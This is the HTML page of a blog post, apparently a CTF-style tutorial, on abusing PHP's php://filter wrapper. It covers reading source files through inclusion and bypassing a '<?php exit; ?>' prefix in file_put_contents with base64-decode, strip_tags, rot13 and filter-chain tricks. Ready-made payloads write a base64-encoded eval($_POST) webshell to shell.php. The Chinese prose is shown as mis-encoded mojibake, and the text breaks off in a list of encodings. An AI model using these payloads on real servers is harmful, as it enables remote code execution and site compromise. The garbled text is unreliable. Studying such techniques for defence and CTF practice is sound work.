

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="make changes, make perfect">
  <meta name="author" content="Dr34d">
  <meta name="keywords" content="blog">
  <title>php://filteråˆ©ç”¨æ‰‹æ³• - Dr34d&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/LFI_RFI_banner.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="php://filteråˆ©ç”¨æ‰‹æ³•">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-10-28 15:04" pubdate>
        2020å¹´10æœˆ28æ—¥ ä¸‹åˆ
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.8k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      95
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">php://filteråˆ©ç”¨æ‰‹æ³•</h1>
            
              <p class="note note-info">
                
                  æœ¬æ–‡æœ€åæ›´æ–°äºï¼š1 ä¸ªæœˆå‰
                
              </p>
            
            <div class="markdown-body">
              <h1 id="php-filteråˆ©ç”¨æ‰‹æ³•"><a href="#php-filteråˆ©ç”¨æ‰‹æ³•" class="headerlink" title="php://filteråˆ©ç”¨æ‰‹æ³•"></a>php://filteråˆ©ç”¨æ‰‹æ³•</h1><p>å¸¸è§payload</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p><code>php://filter/write=convert.base64-decode/resource=shell.php</code></p>
<div class="hljs code-wrapper"><pre><code class="hljs bash">resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;     è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚
<span class="hljs-built_in">read</span>=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;         è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚
write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;    è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚
&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;        ä»»ä½•æ²¡æœ‰ä»¥ <span class="hljs-built_in">read</span>= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</code></pre></div>





<h3 id="å­—ç¬¦ä¸²è¿‡æ»¤å™¨"><a href="#å­—ç¬¦ä¸²è¿‡æ»¤å™¨" class="headerlink" title="å­—ç¬¦ä¸²è¿‡æ»¤å™¨"></a>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">string.rot13  è¿›è¡Œrot13è½¬æ¢
string.toupper  å°†å­—ç¬¦å…¨éƒ¨å¤§å†™
string.tolower  å°†å­—ç¬¦å…¨éƒ¨å°å†™
string.strip_tags å»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœã€‚åŠŸèƒ½ç±»ä¼¼äºstrip_tags()å‡½æ•°ï¼Œè‹¥ä¸æƒ³æŸäº›å­—ç¬¦ä¸è¢«æ¶ˆé™¤ï¼Œåé¢è·Ÿä¸Šå­—ç¬¦ï¼Œå¯åˆ©ç”¨å­—ç¬¦ä¸²æˆ–æ˜¯æ•°ç»„ä¸¤ç§æ–¹å¼ã€‚ï¼ˆè‡ªPHP 7.3.0èµ·å·²å¼ƒç”¨æ­¤åŠŸèƒ½ã€‚ï¼‰</code></pre></div>



<h3 id="è½¬æ¢è¿‡æ»¤å™¨"><a href="#è½¬æ¢è¿‡æ»¤å™¨" class="headerlink" title="è½¬æ¢è¿‡æ»¤å™¨"></a>è½¬æ¢è¿‡æ»¤å™¨</h3><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode
<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode</code></pre></div>



<h3 id="å‹ç¼©è¿‡æ»¤å™¨"><a href="#å‹ç¼©è¿‡æ»¤å™¨" class="headerlink" title="å‹ç¼©è¿‡æ»¤å™¨"></a>å‹ç¼©è¿‡æ»¤å™¨</h3><div class="hljs code-wrapper"><pre><code class="hljs nsis"><span class="hljs-literal">zlib</span>.deflate å‹ç¼©
<span class="hljs-literal">zlib</span>.inflate è§£å‹
<span class="hljs-literal">bzip2</span>.compress
<span class="hljs-literal">bzip2</span>.decompress</code></pre></div>





<h3 id="åŠ å¯†è¿‡æ»¤å™¨"><a href="#åŠ å¯†è¿‡æ»¤å™¨" class="headerlink" title="åŠ å¯†è¿‡æ»¤å™¨"></a>åŠ å¯†è¿‡æ»¤å™¨</h3><h2 id="0x01-XXEä¸­çš„ä½¿ç”¨"><a href="#0x01-XXEä¸­çš„ä½¿ç”¨" class="headerlink" title="0x01 XXEä¸­çš„ä½¿ç”¨"></a>0x01 XXEä¸­çš„ä½¿ç”¨</h2><p>åœ¨XXEä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†PHPç­‰å®¹æ˜“å¼•å‘å†²çªçš„æ–‡ä»¶æµç”¨php://filteråè®®æµå¤„ç†ä¸€éï¼Œè¿™æ ·å°±èƒ½æœ‰æ•ˆè§„é¿ç‰¹æ®Šå­—ç¬¦é€ æˆæ··ä¹±ã€‚</p>
<p>å¦‚ä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-693b1469385893.png" alt="QQæˆªå›¾20160724235335.png"></p>
<h2 id="0x02-file-put-contents-filename-â€-lt-php-exit-â€-content"><a href="#0x02-file-put-contents-filename-â€-lt-php-exit-â€-content" class="headerlink" title="0x02 file_put_contents($filename,â€&lt;?php exit();â€.$content);"></a>0x02 file_put_contents($filename,â€&lt;?php exit();â€.$content);</h2><h3 id="1-base64-decodeç»•è¿‡exit"><a href="#1-base64-decodeç»•è¿‡exit" class="headerlink" title="1. base64-decodeç»•è¿‡exit"></a>1. base64-decodeç»•è¿‡exit</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;
<span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];
file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);</code></pre></div>

<p><code>$content</code>åœ¨å¼€å¤´å¢åŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼ˆè¿™ä¸ªè¿‡ç¨‹åœ¨å®æˆ˜ä¸­ååˆ†å¸¸è§ï¼Œé€šå¸¸å‡ºç°åœ¨ç¼“å­˜ã€é…ç½®æ–‡ä»¶ç­‰ç­‰åœ°æ–¹ï¼Œä¸å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®çš„æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«åŠ ä¸Šif(!defined(xxx))exit;ä¹‹ç±»çš„é™åˆ¶ï¼‰ã€‚é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä½•ç»•è¿‡è¿™ä¸ªâ€œæ­»äº¡exitâ€ï¼Ÿ</p>
<p>æˆ‘ä»¬å³å¯ä½¿ç”¨ php://filteråè®®æ¥æ–½å±•é­”æ³•ï¼š<strong>ä½¿ç”¨php://filteræµçš„base64-decodeæ–¹æ³•ï¼Œå°†<code>$content</code>è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤â€œæ­»äº¡exitâ€ã€‚</strong></p>
<p>base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p>
<p>æ‰€ä»¥ï¼Œä¸€ä¸ªæ­£å¸¸çš„base64_decodeå®é™…ä¸Šå¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);
base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);</code></pre></div>



<p>æ‰€ä»¥ï¼Œå½“<code>$content</code>è¢«åŠ ä¸Šäº†<code>&lt;?php exit; ?&gt;</code>ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>å­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚</strong></p>
<p><strong>â€œphpexitâ€ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 1ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œâ€phpexitaâ€è¢«æ­£å¸¸è§£ç ï¼Œ</strong>è€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯<code>&lt;?php exit; ?&gt;</code>æ²¡æœ‰äº†ã€‚</p>
<p>payloadï¼š</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash">txt=aPD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></pre></div>



<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906091228807.png" alt="image-20200906091228807"></p>
<h3 id="2-strip-tags-base64-decodeç»„åˆåˆ©ç”¨"><a href="#2-strip-tags-base64-decodeç»„åˆåˆ©ç”¨" class="headerlink" title="2. strip_tags+base64-decodeç»„åˆåˆ©ç”¨"></a>2. strip_tags+base64-decodeç»„åˆåˆ©ç”¨</h3><p>è¿™ä¸ª<code>&lt;?php exit; ?&gt;</code>å®é™…ä¸Šæ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp://filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚</p>
<p>ç¼–å†™å¦‚ä¸‹æµ‹è¯•ä»£ç å³å¯æŸ¥çœ‹ php://filter/read=string.strip_tags/resource=php://input çš„æ•ˆæœï¼š</p>
<div class="hljs code-wrapper"><pre><code class="hljs lisp">echo readfile(&#x27;php<span class="hljs-symbol">://filter/read=string</span>.strip_tags/resource=php<span class="hljs-symbol">://input</span>&#x27;)<span class="hljs-comment">;</span></code></pre></div>

<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-499a1469385895.png" alt="QQæˆªå›¾20160725010403.png"></a></p>
<p>å¯è§ï¼Œ<code>&lt;?php exit; ?&gt;</code>è¢«å»é™¤äº†ã€‚ä½†å›åˆ°ä¸Šé¢çš„é¢˜ç›®ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯å†™å…¥ä¸€ä¸ªwebshellï¼Œè€Œå†™å…¥çš„webshellä¹Ÿæ˜¯phpä»£ç ï¼Œå¦‚æœä½¿ç”¨strip_tagsåŒæ ·ä¼šè¢«å»é™¤ã€‚</p>
<p>ä¸‡å¹¸çš„æ˜¯ï¼Œ<strong>php://filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†webshellç”¨base64ç¼–ç ã€‚åœ¨è°ƒç”¨å®Œæˆstrip_tagsåå†è¿›è¡Œbase64-decode</strong>ã€‚â€œæ­»äº¡exitâ€åœ¨ç¬¬ä¸€æ­¥è¢«å»é™¤ï¼Œè€Œwebshellåœ¨ç¬¬äºŒæ­¥è¢«è¿˜åŸã€‚</p>
<p>payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash">txt=PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></pre></div>



<h3 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3. rot13"></a>3. rot13</h3><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥**åˆ©ç”¨rot13ç¼–ç ç‹¬ç«‹å®Œæˆä»»åŠ¡ã€‚åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€œæ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>**ï¼Œåœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†ï¼š</p>
<p>payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.rot13/</span>resource=shell.php</code></pre></div>



<p>è¿™ç§æ–¹æ³•æ˜¯éœ€è¦æœåŠ¡å™¨<strong>æ²¡æœ‰å¼€å¯çŸ­æ ‡ç­¾</strong>çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ï¼ˆé»˜è®¤æƒ…å†µæ˜¯æ²¡å¼€å¯çš„ï¼šphp.iniä¸­çš„short_open_tagï¼‰</p>
<h3 id="4-åŠ å…¥ä¸å­˜åœ¨çš„è¿‡æ»¤å™¨"><a href="#4-åŠ å…¥ä¸å­˜åœ¨çš„è¿‡æ»¤å™¨" class="headerlink" title="4. åŠ å…¥ä¸å­˜åœ¨çš„è¿‡æ»¤å™¨"></a>4. åŠ å…¥ä¸å­˜åœ¨çš„è¿‡æ»¤å™¨</h3><p>ä¸Šé¢çš„åœºæ™¯ä¸­ï¼Œè€ƒè™‘å¦‚ä¸‹çš„payloadï¼š</p>
<p><code>php://filter/write=string.strip_tags|sssss|convert.base64-decode/resource=shell.php</code></p>
<p>å…¶ä¸­ssssè¿‡æ»¤å™¨ä¸å­˜åœ¨ï¼Œä½†æ˜¯ä¸å¦¨ç¢æˆ‘ä»¬å†™å…¥shellï¼Œæ­¤å¤„phpåªä¼šæŠ¥ä¸€ä¸ªwarningï¼Œå¹¶ä¸ä¼šç»“æŸè¿è¡Œã€‚</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906103602914.png" alt="image-20200906103602914"></p>
<h2 id="0x03-file-put-contents-a-â€-lt-php-exit-â€-a"><a href="#0x03-file-put-contents-a-â€-lt-php-exit-â€-a" class="headerlink" title="0x03 file_put_contents($a,â€&lt;?php exit();â€.$a);"></a>0x03 file_put_contents($a,â€&lt;?php exit();â€.$a);</h2><div class="hljs code-wrapper"><pre><code class="hljs php">file_put_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$a</span>);</code></pre></div>



<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h3><p><code>$a = php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</code></p>
<p><strong>php://filteré¢å¯¹ä¸å¯ç”¨çš„è§„åˆ™æ˜¯æŠ¥ä¸ªWarningï¼Œç„¶åè·³è¿‡ç»§ç»­æ‰§è¡Œçš„ï¼ˆä¸ä¼šé€€å‡ºï¼‰</strong>ï¼Œæ‰€ä»¥æŒ‰ç†è¯´è¿™æ ·æ„é€ æ˜¯<strong>â€œå¾ˆå®Œç¾â€</strong>çš„ï¼Œæˆ‘ä»¬çœ‹ä¸‹base-decodeå“ªäº›å­—ç¬¦ğŸ‘‡</p>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>//filter/write=convertbase<span class="hljs-number">64</span>decodePD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+/resource=Cyc<span class="hljs-number">1</span>e.php</code></pre></div>

<p>è€Œé»˜è®¤æƒ…å†µä¸‹base64ç¼–ç æ˜¯ä»¥ <code>=</code> ä½œä¸ºç»“å°¾çš„ï¼Œæ‰€ä»¥<strong>æ­£å¸¸è§£ç çš„æ—¶å€™åˆ°äº† <code>=</code> å°±è§£ç ç»“æŸäº†</strong>ï¼Œå³ä½¿æˆ‘ä»¬æ„é€ payloadçš„æ—¶å€™ä¸ç”¨<code>write=</code>ï¼Œä½†æ˜¯åœ¨æœ€åè·å–æ–‡ä»¶åçš„æ—¶å€™<code>resource=</code>ä¸­çš„ <code>=</code> è¿‡ä¸æ‰ï¼Œæ‰€ä»¥å¯¼è‡´è¿‡æ»¤å™¨è§£ç å¤±è´¥ï¼Œ<strong>ä»è€ŒæŠ¥é”™ï¼ˆä¸è¿‡è¿˜æ˜¯ä¼šåˆ›å»ºæ–‡ä»¶çš„ï¼Œå†…å®¹ç”±äºè§£ç è¿‡ç¨‹å‡ºé”™äº†ï¼Œå°±éƒ½ä¸¢å¼ƒäº†ï¼‰</strong></p>
<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2. rot13"></a>2. rot13</h3><p>rot13ç¼–ç å°±ä¸å­˜åœ¨base64çš„é—®é¢˜ï¼Œæ‰€ä»¥å’Œå‰é¢base64æ„é€ çš„æ€è·¯ä¸€æ ·ğŸ‘‡</p>
<div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">$<span class="hljs-keyword">a</span> = php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre></div>

<p><img src="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt="img"></p>
<p>å’Œå‰é¢æåˆ°çš„ä¸€æ ·ï¼Œè¿™ç§æ–¹æ³•æ˜¯éœ€è¦æœåŠ¡å™¨<strong>æ²¡æœ‰å¼€å¯çŸ­æ ‡ç­¾</strong>çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ï¼ˆé»˜è®¤æƒ…å†µæ˜¯æ²¡å¼€å¯çš„ï¼šphp.iniä¸­çš„short_open_tagï¼ˆå†è¡¥å……ä¸€ä¸‹ï¼Œlinuxä¸‹é»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯çš„ï¼‰ï¼‰</p>
<h3 id="3-iconvå­—ç¬¦ç¼–ç è½¬æ¢"><a href="#3-iconvå­—ç¬¦ç¼–ç è½¬æ¢" class="headerlink" title="3. iconvå­—ç¬¦ç¼–ç è½¬æ¢"></a>3. iconvå­—ç¬¦ç¼–ç è½¬æ¢</h3><p>è¿™ç§æ–¹æ³•ç”±äºä¹‹å‰æ²¡æœ‰è§è¿‡ï¼Œæ‰€ä»¥æ„Ÿè§‰è¿™æ³¢æ“ä½œæ¯”æˆ‘çš„äºšç´¢è¿˜è¦ç§€~ï¼Œæƒ³æ³•æ˜¯ä¸€æ ·çš„ï¼Œ<strong>é€šè¿‡å­—ç¬¦è½¬æ¢æŠŠ<code>&lt;?php exit();</code>è½¬æˆä¸èƒ½è§£æçš„ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯UCS-2æˆ–è€…UCS-4ç¼–ç æ–¹å¼ï¼ˆå½“ç„¶è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚utf-8å’Œutf-7ï¼‰ï¼Œè€Œæˆ‘ä»¬æ„é€ çš„è½¬æˆå¯æ­£å¸¸è§£æçš„</strong></p>
<p>å®˜æ–¹æ–‡æ¡£ä¸­æ”¯æŒçš„</p>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span>
<span class="hljs-attribute">UTF7</span>-IMAP
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>
<span class="hljs-attribute">ASCII</span>
<span class="hljs-attribute">EUC</span>-JP
<span class="hljs-attribute">SJIS</span>
<span class="hljs-attribute">eucJP</span>-win
<span class="hljs-attribute">SJIS</span>-win
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS
<span class="hljs-attribute">CP932</span>
<span class="hljs-attribute">CP51932</span>
<span class="hljs-attribute">SJIS</span>-mac (alias: MacJapanese)
<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO (alias: SJIS-DOCOMO)
<span class="hljs-attribute">SJIS</span>-Mobile#KDDI (alias: SJIS-KDDI)
<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)
